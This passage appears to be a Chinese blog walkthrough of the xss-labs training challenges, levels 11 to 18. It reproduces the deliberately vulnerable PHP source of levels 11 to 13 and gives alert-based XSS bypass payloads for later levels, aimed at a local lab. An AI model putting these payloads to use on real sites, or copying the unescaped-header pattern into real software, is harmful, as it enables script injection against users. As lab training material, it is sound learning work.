class=\"token punctuation\">></span></span>欢迎来到level11<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level11<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str00</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"t_sort\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str11</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_REFERER'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  获取referer赋值给<span class=\"token variable\">$str11</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str22</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">></span>替换为空</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str33</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> 赋值给<span class=\"token variable\">$str33</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>没有找到和\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"相关的结果.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;form id=search></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;input name=\"t_link\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;input name=\"t_history\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=\"t_sort\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str00</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input name=\"t_ref\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str33</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"> value=$str33</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level11.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h4 id=\"第十二关\"><a class=\"markdownIt-Anchor\" href=\"#第十二关\">#</a> <span class=\"label\">第十二关</span></h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level13.php?keyword=good job!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level12<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level12<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str00</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"t_sort\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str11</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_USER_AGENT'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> 这次获取的<span class=\"token constant\">UA</span>头内容</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str22</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str33</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>没有找到和\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"相关的结果.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;form id=search></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;input name=\"t_link\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;input name=\"t_history\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=\"t_sort\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str00</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input name=\"t_ua\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str33</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level12.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>这次获取的 UA 头内容其他跟上关一样改一下就行了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/37.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/38.png\" alt=\"\"></p>\n<h4 id=\"第十三关\"><a class=\"markdownIt-Anchor\" href=\"#第十三关\">#</a> <span class=\"label\">第十三关</span></h4>\n<p>这次获取的 cookie 其他跟上关一样改一下就行了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level14.php\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level13<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level13<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"call me maybe?\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">3600</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str00</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"t_sort\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str11</span><span class=\"token operator\">=</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str22</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$str33</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>没有找到和\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"相关的结果.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;form id=search></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;input name=\"t_link\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=\"t_history\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input name=\"t_sort\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str00</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;input name=\"t_cook\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str33</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level13.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/39.png\" alt=\"\"></p>\n<h4 id=\"第十五关\"><a class=\"markdownIt-Anchor\" href=\"#第十五关\">#</a> <span class=\"label\">第十五关</span></h4>\n<p>f12 看到 ngInclude: undefined 未定义</p>\n<p>定义和用法</p>\n<p>ng-include 指令用于包含外部的 HTML 文件。</p>\n<p>包含的内容将作为指定元素的子节点。</p>\n<p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p>\n<p>默认情况下，包含的文件需要包含在同一个域名下。</p>\n<p>用他去包含第一关</p>\n<p>src=‘level1.php?name=<img onerror=alert(3)>’</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/40.png\" alt=\"\"></p>\n<h4 id=\"第十六关\"><a class=\"markdownIt-Anchor\" href=\"#第十六关\">#</a> <span class=\"label\">第十六关</span></h4>\n<p>script 和 / 空格没了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/41.png\" alt=\"\"></p>\n<p><code>html中是可以将%0a和%0d作为空格使用的</code></p>\n<p><code>&lt;a%0adonmouseover='alert(1)'&gt;</code></p>\n<p><code>划过触发的事件*onmouseover*</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/42.png\" alt=\"\"></p>\n<h4 id=\"第十七关\"><a class=\"markdownIt-Anchor\" href=\"#第十七关\">#</a> <span class=\"label\">第十七关</span></h4>\n<p>转义后给了 embed 标签</p>\n<p>embed 标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed 标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/43.png\" alt=\"\"></p>\n<p><code>构建[http://127.0.0.1/xss-labs/level17.php?arg01=a&amp;arg02=234567%20onmouseover=%27alert(1)%27]</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/44.png\" alt=\"\"></p>\n<h4 id=\"第十八关\"><a class=\"markdownIt-Anchor\" href=\"#第十八关\">#</a> <span class=\"label\">第十八关</span></h4>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS94c3MtbGFicy9sZXZlbDE4LnBocD9hcmcwMT1hJmFtcDthcmcwMj01NTUlMjBvbm1vdXNlb3Zlcj0lMjdhbGVydCgxKSUyNw==\">http://127.0.0.1/xss-labs/level18.php?arg01=a&amp;arg02=555 onmouseover=‘alert(1)’</span>](<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS94c3MtbGFicy9sZXZlbDE4LnBocD9hcmcwMT1hJmFtcDthcmcwMj01NTU=\">http://127.0.0.1/xss-labs/level18.php?arg01=a&amp;arg02=555</span> onmouseover=‘alert(1)’)</p>\n<p>一样通关</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/45.png\" alt=\"\"></p>\n<h4 id=\"总结\"><a 